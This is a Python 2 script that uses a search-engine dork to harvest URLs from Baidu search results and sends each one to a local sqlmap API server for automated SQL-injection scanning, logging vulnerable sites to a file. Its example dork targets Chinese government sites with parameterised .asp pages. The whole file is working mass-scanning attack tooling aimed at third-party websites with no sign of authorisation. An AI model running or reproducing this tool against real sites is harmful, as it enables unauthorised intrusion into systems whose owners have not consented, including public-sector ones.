#!/usr/bin/env python
# encoding: utf-8
#!Create By David_Ning

import re,requests,BeautifulSoup
from bs4 import BeautifulSoup
from termcolor import colored
import json,time

sqlmap_server_ip_port = "http://127.0.0.1:9090"
header_dict = {}
header_dict['Content-Type']='application/json'
cant_connect_notice = u'connection timed out to the target URL or proxy. sqlmap is going to retry the request'

def NewScanTask(url_test):
    scan_data = {}
    scan_data['url'] = url_test

    s=requests.get(sqlmap_server_ip_port+"/task/new")
    if s.json()['success'] == True :
        taskid = s.json()['taskid']
        print colored("[=]new task success.Task_id:"+taskid,'green')
    s=requests.post(sqlmap_server_ip_port+"/scan/"+taskid+"/start",data=json.dumps(scan_data),headers=header_dict)
    if s.json()['success'] == True :
        print colored("[=]task start successfully.",'green')

    s=requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/status")
    while not (s.json()['status'] == 'terminated'):
        print "[-]sqlinject scanning..."
        j=0
        time.sleep(25)
        s=requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/status")

        scan_log_pre = requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/log")
        scan_log = scan_log_pre.json()[u'log']

        for i in scan_log:
            if cant_connect_notice in i['message']:
                j=j+1
                if j>4:
                    print colored("[*]Sqlmap_Scan_Process Can't Connect Target!",'yellow')
                    break
        if j>4:
            break
#跟踪sqlmapapi扫描状态及扫描日志，判断sqlmap扫描过程连接失败次数，大于4次时不再等待退出循环，进行下一个url扫描。

    if s.json()['status'] == 'terminated':
        print colored("[+]sqlinject scanning terminated successfully.",'green')

    s=requests.get("http://127.0.0.1:9090/scan/"+str(taskid)+"/data")
    if not bool(s.json()[u'data']==[]):
        print colored("[!]Hey!I Find SQLinject Url!-----$$"+url_test,'red')
        fd0 = open("SQLinject_Urls.txt",'a')
        fd0.writelines(url_test+'\n')
        fd0.close()
#将url利用sqlmapapi服务进行SQL注入扫描，识别存在漏洞的将url存储在SQLinject_Urls.txt中。

keyword = raw_input("Input some keyword.\n'For example,site:.gov.cn inurl:.asp?id='\n|--->")
search_url_count = raw_input("How many urls you wanna to search?(10<n<50)\n n = ")
page_number = raw_input("Search Url Page Number(1<m<20)?\n page_number = ")
search_url = "http://www.baidu.com/s?wd="+keyword+"&cl=3&rn="+str(search_url_count)+"&pn="+str(page_number)

r = requests.get(search_url)
soup = BeautifulSoup(r.text)
pre_urls = soup.findAll(attrs={'class':'t'})

waiting_test_urls=[]
re_string = 'http://.*?"'

for pre_url in pre_urls:
    tmp_url = re.findall(re_string,str(pre_url))
    for i in tmp_url:
        i = i[0:-1]
        waiting_test_urls.append(i)
#从百度页面爬取搜索到的url，此时url为百度的跳转url。

test_urls=[]
for i in waiting_test_urls:
    try:
        j = requests.get(i,timeout=15)
        if j.status_code == 200:
            test_urls.append(j.url)
            fd1 = open("More_Urls.txt",'a')
            fd1.writelines(j.url+'\n')
            fd1.close()
    except Exception, e:
        print colored("[!]Test_Url_Connect_Stability_Process Time Out!",'yellow')
test_urls = list(set(test_urls))
print colored("[+]Find Urls Counts:"+str(len(test_urls)),"green")
print "And These Urls Save into More_Urls.txt successfully."
#将百度的跳转url转换成目标真实url形成待检测的url列表test_urls，并将其存储在More_Urls.txt

for i in test_urls:
    testing_url = url_status_code =''
    try:
        r = requests.get(i,timeout=20)
        testing_url = r.url
        url_status_code = str(r.status_code)
    except Exception, e:
        print colored("[!]Ready_Test_Process Time Out!","yellow")

    print colored("[+]Sql_Inject_Scan Target Url:"+testing_url,'green')
    print colored("[+]Response Code:"+url_status_code,'green')

    if (url_status_code == '200') and ('?' in testing_url):
        NewScanTask(testing_url)
#对待检测的列表test_urls测试链接稳定性并调用SQL注入扫描函数NewScanTask()逐个检测。

print colored("[$]Job Done!","green")

